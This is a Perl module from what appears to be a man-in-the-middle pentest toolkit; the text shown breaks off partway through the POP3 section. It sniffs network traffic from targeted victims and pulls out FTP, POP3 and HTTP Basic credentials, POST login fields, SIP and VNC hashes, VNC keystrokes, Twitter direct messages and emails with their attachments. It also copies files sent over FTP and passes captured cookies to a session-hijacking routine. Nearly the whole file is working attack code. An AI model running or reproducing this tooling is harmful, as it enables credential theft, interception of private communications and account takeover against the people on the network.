#!/usr/bin/perl
#
# This is propietary code of 0hday.org for enciclopedia
# pentestica, this is is released under beerware license
# don't remove this headers and send comments to flames@0hday.org
# (YES it does exist, ping emails will not be answered)
#
# Jorge A. Trujillo <crypkey@0hday.org>
# F. Javier Carlos Rivera <nediam@nediam.com.mx>
# Enrique A. Sanchez Montellano <nahual@0hday.org>
#
#
# Trapper_Sniffing : Trapper module that contains functions related to sniffing mode
#

package Trapper_sniffing;
use Exporter 'import';
use Trapper_APR;
use Encode;
use DBI;
use MIME::Base64;
use Tie::File;
use Net::RawIP;
use Socket;
use URI::Escape;
use NetPacket::Ethernet qw(:strip);
use Compress::Zlib;
use IO::Uncompress::Gunzip qw(gunzip $GunzipError);
use JSON;

@EXPORT = qw(start_sniffer process_packet process_protocols get_smb_command get_nt_status get_message_type trim parsehex ascii2hex hex2ascii dec2hex);

# Function that create a packet capturer descriptor and start sniffing 
sub start_sniffer {
    ($dev, $filter_str, $dumpirc, $dumpmsn, $dumpcook, $mac_attacker, $len, $promisc, $ip_attacker, $debug, @victims) = @_;
	$| = 1;
	if (-e "trapper.pid" ) {
        $SIG{'QUIT'}=\&cleanarp;
		$SIG{'INT'}=\&cleanarp;	
	}
	else {
		$SIG{'QUIT'}=\&cleansniff;
		$SIG{'INT'}=\&cleansniff; 
	}
	$sniffcnt = 0;
	$promisc = ($promisc) ? 0 : 1;
	$timeout = 0;
    %vnchexval = ('ff08', " Backspace ", 'ff09', " TAB ", 'ffe1', "", 'ff1b', " ESC ",
                  'ffe2', "", 'ffe3', " CTRL ", 'ffe9', " Alt ", 'ffff', " Delete ",
                  'ffbe', " F1 ", 'ffbf', " F2 ", 'ffc0', " F3 ", 'ffc0', " F3 ",
                  'ffc1', " F4 ", 'ffc2', " F5 ", 'ffc3', " F6 ", 'ffc4', " F7 ",
                  'ffc5', " F8 ", 'ffc6', " F9 ", 'ffc7', " F10 ", 'ffc8', " F11 ",
                  'ffc9', " F12 ", 'fe03', "Alt+Gr");   
	if ((Net::Pcap::lookupnet($dev, \$net, \$mask, \$err)) == -1 ) { die ("\n\nError: Unable to determine network on '$dev'\n"); }
	$pcap = Net::Pcap::open_live($dev, $len, $promisc, $timeout, \$err) or die("Can't open device $dev: $err\n");
	# Filtering
	if($filter_str) {
		Net::Pcap::compile($pcap, \$filter, $filter_str, 1, $mask) && die ("\n\nError: Unable to compile packet capture filter\n");
		Net::Pcap::setfilter($pcap, $filter) && die ("\n\nError: Unable to set packet capture filter\n");
	}
	Net::Pcap::loop($pcap, -1, \&process_protocols, $mac_attacker);
	Net::Pcap::close($pcap);
}


# Function that process every packet captured
sub process_protocols {
	($mac_attacker, $header, $packet) = @_;
	#Global stuff
	$ip = NetPacket::IP->decode(eth_strip($packet));
	$tcp = NetPacket::TCP->decode($ip->{data});
    $udp = NetPacket::UDP->decode($ip->{data});
	$mac = NetPacket::Ethernet->decode($packet);
	@marc_source = split(//, $mac->{src_mac});
	@marc_dest = split(//, $mac->{dest_mac});
	$mac_src = "$marc_source[0]$marc_source[1]:$marc_source[2]$marc_source[3]:$marc_source[4]$marc_source[5]:$marc_source[6]";
	$mac_src .= "$marc_source[7]:$marc_source[8]$marc_source[9]:$marc_source[10]$marc_source[11]";
	$mac_dst = "$marc_dest[0]$marc_dest[1]:$marc_dest[2]$marc_dest[3]:$marc_dest[4]$marc_dest[5]:$marc_dest[6]";
	$mac_dst .= "$marc_dest[7]:$marc_dest[8]$marc_dest[9]:$marc_dest[10]$marc_dest[11]";
	$tcp_data = $tcp->{data};
	$udp_data = $udp->{data};
	
	if (!$readtime) {
		read_configuration();
		$httpports[0] = trim($httpports[0]);
        $httpports[1] = trim($httpports[1]);
        $httpports[2] = trim($httpports[2]);
        $httpports[3] = trim($httpports[3]);
        $readtime = 1; 
	}
	# FTP STOR File snarfing
	if ($tcp->{dest_port} eq $file_hash{$tcp->{src_ip}}->{passive_port}) {
		ftp_file_steal($file_hash{tcp->{src_ip}}->{file_name}, $tcp_data);
        return;
	}
    # FTP RETR File snarfing
        if ($tcp->{src_port} eq $file_hash{$tcp->{src_ip}}->{passive_port}) {
		ftp_file_steal($file_hash{tcp->{src_ip}}->{file_name}, $tcp_data);
        return;
	}
    # VNC key/challenges sniffing ;)
    if ($tcp->{dest_port} eq "$vnc" || $tcp->{src_port} eq "$vnc") {
        ($vnchex,$chkvncip) = "";
        $vnchex = unpack('H*', $tcp_data);
        $chkvncip = checkvncip($tcp->{dest_ip});                
        if (length($vnchex) eq 32 && $tcp->{src_port} eq "$vnc") { $vncservchall = $vnchex; }
        if (length($vnchex) && $tcp->{dest_port} eq "$vnc") { $vncclientchall = $vnchex; }
        if ($vncservchall && $vncclientchall) {
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (VNC)";
            print "$info\n";
            print "VNC Hashes Detected!\n";
            print "VNC Server Challenge: $vncservchall\n";
            print "VNC Client Response: $vncclientchall\n\n";
            if ($logvnc eq "yes") {
                open(vnc,">>vnc.txt") || print "Error: Cannot write vnc saving file.\n";
                print vnc "$info\n";
                print vnc "VNC Hashes Detected!\n";
                print vnc "VNC Server Challenge: $vncservchall\n";
                print vnc "VNC Client Response: $vncclientchall\n\n";
                close(vnc);
            }                        
			($vncservchall, $vncclientchall) = "";
            $sniffcnt++;
            return;
        }
        if (!$chkvncip && $tcp->{dest_port} eq "$vnc") {
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (VNC)";
            $vncserver = trim($ip->{dest_ip});
            print "$info\n";
            print "VNC Session detected\n";
            print "Saving all keystrokes\n";
            print "File: vnc/$ip->{dest_ip}\n\n";
        }                
        if ($vnchex =~ /(04010000)/s && $tcp->{dest_port} eq "$vnc") {
            $hexind = index($vnchex, '00', 3);
            # Finding our offset
            while ($hexind != -1) {
                $offset = $hexind + 2;
                $hexind = index($vnchex, '00', $offset);
            }
            $hexletter = trim(substr($vnchex, $offset));
            open(vnc,">>vnc/$vncserver") || print "Error: Cannot write vnc saving file.\n\n";
            foreach $key (sort keys %vnchexval) {
                $keyhex = trim($key);
                $valuehex = $vnchexval{$keyhex};
                if ($hexletter eq $keyhex) {
                    print vnc "$valuehex";
                    close(vnc);
                    return;
                }
                elsif ($hexletter eq '20') {
                    print vnc " ";
                    close(vnc);
                    return;
                }
                elsif ($hexletter eq 'ff0d') {
                    print vnc "\n";
                    close(vnc);
                    return;
                }
            }
            # Printing normal chars
            $letter = trim(hex2ascii($hexletter));
            print vnc "$letter";
            close(vnc);
            return;    
        }                
    }
    # TeamSpeak sniffing / convo sniffing not 100% parsed   
    if ($udp->{dest_port} eq "$teamspeak") {
        $teamhex = unpack('H*', $udp_data);
		if ($teamhex =~ /f0beae/) {
			$udp_data =~ s/\W+//g;
			$udp_data = trim($udp_data);
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$udp->{src_port} --> $ip->{dest_ip}:$udp->{dest_port} (TeamSpeak)";
			if ($debug) { print "[Debug] => Parsing hex data: $teamhex\n\n"; }
			if ($logtmspk eq "yes") {
                open(tmpsk,">>teamspeak_msgs.txt") || print "Error: Cannot write sip message saving file.\n\n";
                print tmpsk "$info\n";
                print tmpsk "Message: $teaminfo\n\n";
                close tmpsk;
            }
			print "$info\n";
			print "TeamSpeak Message detected!\n";
			print "Message: $udp_data\n\n";
			return;
		}
        if ($teamhex =~ /3c000102|f4be0300/s) {
            $offset = index($udp_data, 'TeamSpeak');
            $teaminfo = trim(substr($udp_data, $offset));
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$udp->{src_port} --> $ip->{dest_ip}:$udp->{dest_port} (TeamSpeak)";
            if ($logtmspk eq "yes") {
                open(tmpsk,">>teamspeak.txt") || print "Error: Cannot write sip saving file.\n\n";
                print tmpsk "$info\n";
                print tmpsk "Info: $teaminfo\n\n";
                close tmpsk;
            }			
			if ($debug) { print "[Debug] => Parsing hex data: $teamhex\n\n"; }
            print "$info\n";
            print "Info: $teaminfo\n\n";
            ($teamhex, $teaminfo) = "";
            return;
        }
    }
        
    # SIP Login sniffing
    if ($udp->{dest_port} eq "$sip") {                    
        if ($udp_data =~ /(REGISTER)/s && $udp_data =~ /Authorization/s) {
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$udp->{src_port} --> $ip->{dest_ip}:$udp->{dest_port} (SIP)";
            @splpkt = split("\n", $udp_data);
		    $userinfo = trim($splpkt[3]);
		    $authinfo = trim($splpkt[4]);
		    $authinfo =~ tr/"//d;
		    $authinfo =~ tr/,//d;
            # SIP packet info
			if ($debug) {
				print "[Debug] => Parsing userinfo data: $userinfo\n\n";
				print "[Debug] => Parsing authinfo data: $authinfo\n\n";
			}
		    ($to, $screename, $host) = split(" ", $userinfo);
		    ($auth, $dig, $usrname, $realm, $nonce, $uri, $cnonce, $nc, $response, $opa, $algorithm) = split(" ", $authinfo);
		    ($vuser, $username) = split("=", $usrname);
		    ($vrl, $siphost) = split("=", $realm);
		    ($vonce, $nhash) = split("=", $nonce);
            ($vnonce, $cnonhash) = split("=", $cnonce);
		    ($vuri, $sipuri) = split("=", $uri);
		    ($vresp, $hashresp) = split("=", $response);
		    $screename =~ tr/"//d;
            $sipuri =~ s/(sip:){1}//s;
		    # Just a fast cleanup
		    $username = trim($username);
		    $siphost = trim($siphost);
		    $sipuri = trim($sipuri);
		    $ncvalue = trim($ncvalue);
		    $cnonval = trim($cnonval);
		    $nhash = trim($nhash);
            $cnonhash = trim($cnonhash);
            if ($logsip eq "yes") {
                open(sip,">>sip.txt") || print "Error: Cannot write sip saving file.\n\n";
                print sip "$info\n";
                print sip "SIP URI: $sipuri\n";
                print sip "SIP Realm: $siphost\n";
                print sip "Screename: $screename\n";
                print sip "Username: $username\n";
                print sip "Nonce: $nhash\n";
                print sip "Cnonce: $cnonhash\n";
                print sip "Response Hash: $hashresp\n\n";
                close sip;
            }
            print "$info\n";
		    print "SIP URI: $sipuri\n";
            print "SIP Realm: $siphost\n";
		    print "Screename: $screename\n";
		    print "Username: $username\n";
		    print "Nonce: $nhash\n";
            print "Cnonce: $cnonhash\n";
		    print "Response Hash: $hashresp\n\n";
            return;
        }
    }
	# FTP Sniffing
	if ($tcp->{src_port} eq "$ftp" || $tcp->{dest_port} eq "$ftp") {
		if ($tcp_data =~ /USER (.*)/s) { $ftpuser = trim($1); }
		if ($tcp_data =~ /PASS (.*)/s) { $ftppass = trim($1); }
		if (($ftpuser) && ($ftppass)) {
			$info = "$mac_src --> $mac_dst\n";
			$info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (FTP)";
			chomp($tcp_data);
			print "$info\nUser: $ftpuser\nPass: $ftppass\n\n";
			if ($logftp eq "yes") {
				open(ftp,">>ftp.txt") || print "Error: Cannot write ftp saving file.\n\n";
				print ftp "$info\nUser: $ftpuser\nPass: $ftppass\n\n";
				close(ftp); 
			}
			$sniffcnt++;
			($ftpuser, $ftpass) = "";
			return;
		}
		if ($tcp_data =~ /STOR (.*)/) {
			$filer = trim($1);
			$filer =~ s/\w+\///g;	
			$filer =~ s/\///g;
			$file_hash{$tcp->{src_ip}}->{file_name} = $filer;
			if ($debug) { print "[Debug] => Parsing ftp file name data: $file\n\n"; }
			print "$infosteal\n";
			print "Stealing file => $filer....[OK]\n\n";
			$sniffcnt++;
			return;
		}
        if ($tcp_data =~ /RETR (.*)/) {
 			$filer = trim($1);
			$filer =~ s/\w+\///g;	
			$filer =~ s/\///g;
			$file_hash{$tcp->{src_ip}}->{file_name} = $filer;
			if ($debug) { print "[Debug] => Parsing ftp file name data: $file\n\n"; }
			print "$infosteal\n";
			print "Stealing file => $filer....[OK]\n\n";
			$sniffcnt++;
			return;                       
        }        
		if ($tcp_data =~ /227 (.*)/) {
			@results = split(/,/, $tcp_data);
			$multiplicator = $results[4];
			$ftp_offset = substr($results[5], 0, -3);
			$passive_port = ($multiplicator * 256) + $ftp_offset;
			if ($debug) {
				print "[Debug] => Parsing ftp_offset data: $ftp_offset\n\n";
				print "[Debug] => Parsing passive port data: $passive_port\n\n";
			}
			$file_hash{$tcp->{src_ip}}->{passive_port} = $passive_port;
			$infosteal = "$mac_src --> $mac_dst\n";
			$infosteal .= "$ip->{dest_ip}:$passive_port -->  $ip->{src_ip}:$tcp->{src_port} (FTP Steal)";
			# We add the port to the filter
			$ftp_snarf_filter = $filter_str . " or port " . $passive_port;
			$ftp_snarf = Net::Pcap::open_live($dev, $len, $promisc, $timeout, \$err) or die("Can't open device $dev: $err\n");
			Net::Pcap::compile($ftp_snarf, \$ftp_snarf_filter, $ftp_snarf_filter, 1, $mask) && die ("\n\nError: Unable to compile packet capture filter\n");
			Net::Pcap::setfilter($ftp_snarf, $ftp_snarf_filter) && die ("\n\nError: Unable to set packet capture filter\n");
			Net::Pcap::loop($ftp_snarf, -1, \&process_protocols, $mac_attacker);
        	}
 	}

	
	# HTTP Sniffing
	if ($tcp->{dest_port} eq "$httpports[0]" || $tcp->{src_port} eq "$httpports[0]"  || $tcp->{dest_port} eq "$httpports[1]" || $tcp->{dest_port} eq "$httpports[2]" || $tcp->{dest_port} eq "$httpports[3]") {
		
		# POST variable validation
		$verify = "0";
        # Post Logins
		if ($tcp_data =~ /\APOST (\S*)/) {
			$urlPath = trim($1);
			if ($tcp_data =~ /Host:\s*(\S*)/s) { 
				$urlHost = trim($1);
			}
			$post = 1;
		}

		# Twitter Direct Messages
		if($tcp_data =~ /\APOST \/direct_messages\/new HTTP\/1.1/ || $tcp_data =~ /\APOST \/1\/direct_messages\/new.json HTTP\/1.1/){
			$flag_twitter_dm = 1;
			chomp($tcp_data);
			$dm_data = $tcp_data;
		}
		elsif($flag_twitter_dm > 0) {
			chomp($tcp_data);
			$dm_data = $dm_data . $tcp_data;
			if($flag_twitter_dm == 3) {
				$dm_data =~ /twid=u%3D([A-Za-z0-9-_:.]+)%/;
                $tw_id = $1;
                $json_data = `curl -s https://api.twitter.com/1/users/show.json?user_id=$tw_id&include_entities=false`;
				$json_data =~ /"screen_name":"([0-9a-zA-Z_]+)"/;
                $tw_from = $1;
				$dm_data =~ /&(screen_name|user)=([0-9a-zA-Z_]+)&/;
				$tw_to = $2;
				$dm_data =~ /&text=(.+)&/;
				$tw_msg = $1;
				$tw_msg =~ s/\+/ /g;
                $tw_msg = uri_unescape($tw_msg);
				$info = "$mac_src --> $mac_dst\n";
				$info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (HTTP)\n";
				if ($loghttp eq "yes") {
					#open(base, ">>:utf8", "twitter.txt") || print("Error: Cannot write twitter saving file.\n\n");  
					open(base, ">>twitter.txt") || print("Error: Cannot write twitter saving file.\n\n");  
					print base "$info";
					print base "Twitter Direct Message\n";
				    print base "From: " . $tw_from . "\n";
					print base "To: " . $tw_to . "\n";
	                print base "Message: " . $tw_msg . "\n\n";
					close(base);
					$sniffcnt++;
				}	
				binmode STDOUT;
				print $info;
				print "Twitter Direct Message\n";
                print "From: " . $tw_from . "\n";
				print "To: " . $tw_to . "\n";
                print "Message: " . $tw_msg . "\n\n";
				$flag_twitter_dm = 0;
				$dm_data = ''; $tw_msg = ''; $tw_from = '';
			}
			else {
				$flag_twitter_dm++;
			}
		}

		# Twitter Normal Posts
		if($tcp_data =~ /\APOST \/1\/statuses\/update.json/) {
			$flag_twitter_msg = 1;
			$flag_twitter_count = 1;
			$gzipError = 0;
			$seq_num = $tcp->{seqnum};
			if (-e "twitter.gz") {
				`/bin/rm twitter.gz`;
			}
			if ($flag_on != 1) {	
				$post_length = length($tcp_data);
			}
		}
		if ($flag_twitter_msg > 0 && $tcp_data =~ /\AHTTP\/1\.1 403 Forbidden/ && $tcp_data =~ /twitter.com/)
		{
			($flag_twitter_msg, $flag_twitter_count) = 0;
			($flag_twitter_msg, $flag_twitter_count, $twitter_response, $count_flag, $flag_on) = 0;
			($hex_gzip, $gzipData, $hex_msg) = '';
			($seq_num, $ack_num, $final_seq, $seq_calc, $post_lenght) = '';
		}
		if ($flag_twitter_msg > 0 && $tcp_data =~ /\AHTTP\/1\.1 200 OK/ && $tcp_data =~ /twitter.com/ && $seq_num > 0) {
			$ack_num = $tcp->{acknum};
			$twitter_response = 1;
		}
		if ($flag_twitter_msg > 0 && !($tcp_data =~ /\APOST|\AGET/) && length($saved_data) != length($tcp_data) ) {
			if ($twitter_response < 1 ) {	
				$seq_calc = $seq_calc + length($tcp_data);
				if ($count_flag == 1 && $flag_on != 1) {
					$seq_calc = $seq_calc + $post_length;
					$final_seq = $seq_calc + $seq_num; 
					$flag_on = 1;
				}
				else {
					$count_flag++;
				}
			}
		}
		if ($flag_twitter_msg > 0 && $twitter_response > 0 && $tcp->{acknum} == $final_seq && !($tcp_data =~ /\AGET|\APOST/)) {
			
				$hex_msg = $hex_msg . unpack('H*', trim($tcp_data));
				$hex_msg = trim($hex_msg);
				$info = "$mac_src --> $mac_dst\n";
				$info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (HTTP)\n";
				$pos = index($hex_msg, '1f8b080000000000000');
				$hex_gzip = substr($hex_msg, $pos);
				
				if(length($hex_gzip) > 500) {
					open(my $fh, '>:raw', 'twitter.gz') || print("Error: Cannot write twitter temp file.\n\n"); 
					binmode $fh;
					$gzipData = pack('H*', trim($hex_gzip));
					binmode $gzipData;
					print $fh $gzipData;
					close($fh);
					#`/bin/gunzip -qf twitter.gz`;
					my $input = "twitter.gz";
					my $output = "twitter";
					gunzip $input => $output or $gzipError = 1;
					if ($gzipError != 1) {
						open(FILE, 'twitter') or die "Can't read twitter temp file.\n"; 
						$json_data = do { local $/; <FILE> };
						close (FILE);
						$json_text = decode_json($json_data);
						$tw_userName = ''; $tw_msg = ''; $tw_nameAccount = '';
						$tw_userName = $json_text->{user}->{screen_name};
						$tw_nameAccount = $json_text->{user}->{name};
						$tw_msg = uri_unescape($json_text->{text});
						if ($loghttp eq "yes") {
							open(base, ">>:utf8", "twitter.txt") || print("Error: Cannot write twitter file.\n\n");  
							print base "$info";
							print base "New Tweet\n";
							print base "Twitter Account: " . $tw_userName . "\n";
							print base "User Name: " . $tw_nameAccount . "\n";
							print base "Message: " . $tw_msg . "\n\n";
							close(base);
							$sniffcnt++;
						}
						binmode STDOUT, ':encoding(UTF-8)';
						print $info;
						print "New Tweet\n";
						print "Twitter Account: " . $tw_userName . "\n";
						print "User Name: " . $tw_nameAccount . "\n";
						print "Message: " . $tw_msg . "\n\n";
						($flag_twitter_msg, $flag_twitter_count) = 0;
						($flag_twitter_msg, $flag_twitter_count, $twitter_response, $count_flag, $flag_on) = 0;
						($hex_gzip, $gzipData, $hex_msg) = '';
						($seq_num, $ack_num, $final_seq, $seq_calc, $post_lenght) = '';
						if (-e "twitter") { `/bin/rm twitter`; }
						if (-e "twitter.gz") { `/bin/rm twitter.gz`; }
					}
					else {
						($flag_twitter_msg, $flag_twitter_count) = 0;
						($flag_twitter_msg, $flag_twitter_count, $twitter_response, $count_flag, $flag_on) = 0;
						($hex_gzip, $gzipData, $hex_msg) = '';
						($seq_num, $ack_num, $final_seq, $seq_calc, $post_lenght) = '';
						if (-e "twitter") { `/bin/rm twitter`; }
						if (-e "twitter.gz") { `/bin/rm twitter.gz`; }
					}
				}
		}
        # Multipart Support
        if (($tcp_data =~ /(Content-Type: multipart\/form-data)/s) && $post eq "1") {
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (HTTP)";
            if ($tcp_data =~ /Content-Disposition: (.*)/smg) {
                $cntmul = 0;
                $multifound = 0;
                $multipart = trim($1);
                @mulval = split("\n", $multipart);
                foreach $multi (@mulval) {
                    chomp($multi);
                    $multi = trim($multi);
                    if ($multi =~ /name=(.*)/s) {
                        $multisearch = trim($1);
                        $multisearch =~ s/"//g;                                            
                        while (($mulkey, $comparemulti) = each(%confields)) {
                            $comparemulti = trim($comparemulti);
                            if ($comparemulti eq $multisearch && $multisearch) {
                                $multival .= "$multisearch => $mulval[$cntmul+2]\n";
                                $multifound = "1";
                            }
                        }
                    }
                    $cntmul++;
                }                
                if ($multifound) {
                    print "$info\n";
                    print "Multipart Post Detected\n";
                    print "$host$urlpath[1]\n";
                    print "Variables parsed: \n";
                    print "$multival\n";
                }
                if ($loghttp eq "yes") {
                    open(multi,">>http.txt") || print("Error: Cannot write http saving file.\n");
                    print multi "Multipart Post Detected\n";
                    print multi "$host$urlpath[1]\n";
                    print multi "Parsed variables: \n\n";
                    close(multi);
                }
                $sniffcnt++;
            }      
            $post = 0;
			($multival,$multipart,$urlpath[1]) = "";
        }  
		if (($tcp_data =~ /(Content-Length: (.*))/s) && $post eq "1") {
			$info = "$mac_src --> $mac_dst\n";
			$info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (HTTP)";
			@httpContent = split("\n", $tcp_data);
			$httpInfo = parsehex(trim($httpContent[-1]));
			if ($httpInfo =~ /&/) {    
			    @splitPost = split(/&/, $httpInfo);
                foreach $httpValue (@splitPost) {
    				$httpValue = trim($httpValue);
    				@splitValue = split(/=/, $httpValue);
    				$httpVar = trim($splitValue[0]);
                    if($httpVar) {
                        # check that the POST characters are printable
                        if($httpVar =~ /[0-9a-zA-Z_]/) {
                            $httpVar =~ s/([\/\(\)\{\}\[\]])//g;
                            while (($mulkey, $configHttp) = each(%confields)) {
                                $configHttp = trim($configHttp);
                                if ($configHttp eq $httpVar) {
                                    @matchFound = (@matchFound,$httpValue);
                                    $verify = "1";
                                    $httpValue = "";
                                }
                            }
                        }
                    }
                    $post = 0;
                }
            }
        }
        # Print POST Information
		if ($verify == 1)  {
			if ($debug) { print "[Debug] => Parsing data: $httpInfo\n\n"; }
            print "$info\n$urlHost$urlPath\n";			
			foreach $httpMatch (@matchFound) { 
				print "Info: $httpMatch\n";
			}
			print "\n";
			if ($loghttp eq "yes") {
                open(http,">>http.txt") || print("Error: Cannot write http saving file.\n\n");
				print http "$info\n$urlHost$urlPath\nInfo: ";
                foreach $httpMatch (@matchFound) {
					$httpMatch = trim($httpMatch);
                    print http $httpMatch;
				}
				print http "\n";
				close(http); 
			}
			for ($i = 0; $i <= $#matchFound; $i++) { 
				delete $matchFound[$i]; 
			}           
			($urlHost, $urlPath, $httpInfo, $httpMatch) = "";
			$sniffcnt++;
			$savedpost = $uspass;
			return;
		}
        # Base64 Sniffing
        if ($tcp_data =~ /(Authorization:\s+Basic\s+(.*))/s) {
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (HTTP)";
            $baseinfo = decode_base64(trim($2));
            $tcp_data =~ /(GET|POST).+/g;
            @head64 = split(" ", $&);
            @base64 = split(/:/, $baseinfo);
            $tcp_data =~ /(Host).+/g;
            $host64 = trim($&);
            $user64 = $base64[0];
            $pass64 = $base64[1];
            $host64 =~ s/(Base)//;
            $pass64 =~ s/\s\S\S+//;
            if ($saved64 ne $baseinfo && $head64[1] ne "/") {
                if ($loghttp eq "yes") {
                    open(base,">>http.txt") || print("Error: Cannot write http saving file.\n\n");  
                    print base "$info\n";
                    print base "Authorization Basic Detected\n";
                    print base "$host64$head64[1]\n";
                    print base "User: $user64\n";
                    print base "Pass: $pass64\n\n";
                    close(base);
                }                            
                print "$info\n";
                print "Authorization Basic Detected\n";
                print "$host64$head64[1]\n";
                print "User: $user64\n";
                print "Pass: $pass64\n\n";
                $saved64 = $baseinfo;
                $baseinfo = "";
                $sniffcnt++;
                return;
            }       
        }        
        # Cookies stuff
		if ($tcp_data =~ /(Cookie:\s\S*\s*(.*))/g) {
			$repcook = 0;
			$cook = trim($1);
            $cook =~ s/(Cookie:)//;
			$cook =~ s/(If-Modified-Since:).*//;
			$cook =~ s/(Keep-Alive).*//;
			$cinfo = "$mac_src --> $mac_dst\n";
			$cinfo .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (Cookie Hijack)";
            if ($tcp_data =~ /Host: (.*)/s) {
				$hostl = trim($1);
				@splih = split("\n", $hostl);
                $cookme = trim($splih[0]);
				$cookhost = "Host: $splih[0]"; 
			}                        
			$repcook = 1 if $cook eq $savedcook;
			if (!$repcook && $cook =~ /=/s) {
                $cookiefinal = "$cinfo\n$cookhost\nCookie: $cook\n";
                if ($dumpcook eq "on") {
					print "$cookiefinal\n" unless (!$cook); 
				}
				if ($logcookie eq "yes") {
					open(COOK,">>cookie.txt") || print("Error: Cannot write cookie saving file.\n\n");
					print COOK "$cookiefinal\n" unless (!$cook);
                    close(COOK); 
				}
				# $mac_src ne $mac_attacker
                if ($monster eq "yes" && $cook) {
                    hijacksession($cook, $cookme, $cinfo);
                }
			}
			$savedcook = $cook;
			($cook, $cookme, $cookhost) = "";
			return;
		}               
	}
	# Mail Sniffing & Snarfing FTW
    if ($tcp->{dest_port} eq "$smtp") {
        if ($tcp_data =~ /\A(Subject: (.*))/s) {
			$info = "$mac_src --> $mac_dst\n";
            $info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (Mail Stealing)";
            $smtph .= $tcp_data;
			$startsmtp = 1; 
            return;
		}       
        if ($tcp_data !~ /\A\RSET/s && $startsmtp) {
            $smtph .= $tcp_data;
            $smtpsaved = $tcp_data;
            return;
        }
        if ($tcp_data =~ /\A(RSET)/s) {
            $smtph = $smtph;
			$email_data = trim($smtph);
            $email_data1 = trim($smtph);
			$email_data2 = trim($smtph);
            # Parsing
            @emailhdr = split("\n", $email_data);
			$email_data1 =~ /(To|TO|to).+/g;    
            $to = trim($&);
			$email_data2 =~ /(From|FROM|from).+/g;
			$from = trim($&);
			if ($debug) {
				print "[Debug] => Parsing data: $from\n";
				print "[Debug] => Parsing data: $to\n\n";
			}
			if (!$from || !$to) {
				return;
			}
            print "$info\n";
            print "E-mail detected\n";
            print "$from\n";
            print "$to\n";

            if ($from =~ /<|>/s) {
                    $from =~ /<(.+)>/;
                    $from2 = trim($1)   
            }
            else {
                    $from =~ s/(To:)//;
                    $from2 = trim($from);  
            }
            if ($to =~ /<|>/s) {
                    $to =~ /<(.+)>/;
                    $to2 = trim($1);
					$to2 =~ s/,.*//g;
            }
            else  {
                    $to =~ s/(To:)//;
                    $to2 = trim($to);
					$to2 =~ s/,.*//g;
            }
			
            if ($email_data =~ /Content-Type: multipart\/mixed/s) {
                $email_data =~ /(Content-Type: multipart\/mixed).+/g;
                $content_line = trim($&);
                $content_line =~ /"(.+)"/;
                $boundary = trim($1);
                $limit = "--$boundary";
                $email_data =~ s/(--=-).*//g;
                $email_data =~ s/$limit--//g;    
                @splitatt = split("Content-Disposition: attachment;", $email_data);
                foreach $mailfo (@splitatt) {
                    $mailfo = trim($mailfo);
                    if ($mailfo =~ /filename/s) {
                        $mailfo =~ /(filename).+/g;
                        $mailtmp = trim($&);
                        @mailfile = split("=", $mailtmp);
						$attachname = trim($mailfile[1]);
                        print "File Stolen: $attachname\n";
                        if ($mailfo =~ /(Content-Type: text\/plain)/s) { $attachment_txt = 1; }
						if ($attachname =~ /(.txt|.asc|.patch)/s) { $attachment_txt = 1; }
                        $mailfo =~ s/filename.*//g;
                        $mailfo =~ s/Content-.*//g;
                        $mailfo =~ s/^\.//g;
                        $mailfo = trim($mailfo);
                        if (!$attachment_txt && $filenamesaved ne $attachname) { $packet_decode = MIME::Base64::decode($mailfo); }
                        elsif ($attachment_txt && $filenamesaved ne $attachname) { $packet_decode = $mailfo; }
                        open(filestolen,">mails/attachments/$mailfile[1]") || print("Error: Cannot write $mailfile[1].\n\n");
                        print filestolen "$packet_decode";
                        close(filestolen);
						$filenamesaved = $attachname;
                    }
                    $attachment_txt = 0;
					$filenamesaved = "";
                }
                # Saving msg
                if ($logsmtp eq "yes") {
                    open(datamsg,">>mails/$from2-$to2") || print("Error: Cannot write $from2-$to2.\n\n");
                    $email_msg = trim($splitatt[0]);
                    print datamsg "[--Email Start--]\n\n";
                    print datamsg "$email_msg\n\n";
                    print datamsg "[--Email Finish--]\n\n";
                    close datamsg;
                }
                $multimime = 1;
                print "\n";
            }
            if ($email_data =~ /(Content-Type: text\/plain)/s && !$multimime) {
                if ($logsmtp eq "yes") {
                    open(datamsg,">>mails/$from2-$to2") || print("Error: Cannot write $from2-$to2.\n\n");
                    $email_msg = trim($email_data);
                    print datamsg "[--Email Start--]\n\n";
                    print datamsg "$email_msg\n\n";
                    print datamsg "[--Email Finish--]\n\n";
                    close datamsg;
                }
            }
            #Cleaning
            $sniffcnt++;
            ($smtph, $email_data, $email_msg) = '';
            ($multimime, $startsmpt) = 0;
			print "\n";
            return;
        }
        return;
    }
	# POP3 sniffing
	if ($tcp->{src_port} eq $pop3 || $tcp->{dest_port} eq $pop3) {
		if ($tcp_data =~ /(USER (.*))/si) { 
			if (!$user) { 
				$popuser = trim($2);
                $srcpop = $tcp->{src_port}; 
			} 
		}
		if (($tcp_data =~ /(PASS (.*))/si) && ($tcp->{src_port} eq $srcpop)) { 
			$poppass = trim($2); 
		}   
		if (($popuser) && ($poppass)) {
            $chkmailuser = chkpop($popuser, $poppass);
            if (!$chkmailuser) {			    
			    if ($debug) { print "[Debug] => Parsing data: $popuser $poppass\n\n"; }
			    $info = "$mac_src --> $mac_dst\n";
                $info .= "$ip->{src_ip}:$tcp->{src_port} --> $ip->{dest_ip}:$tcp->{dest_port} (POP3)";
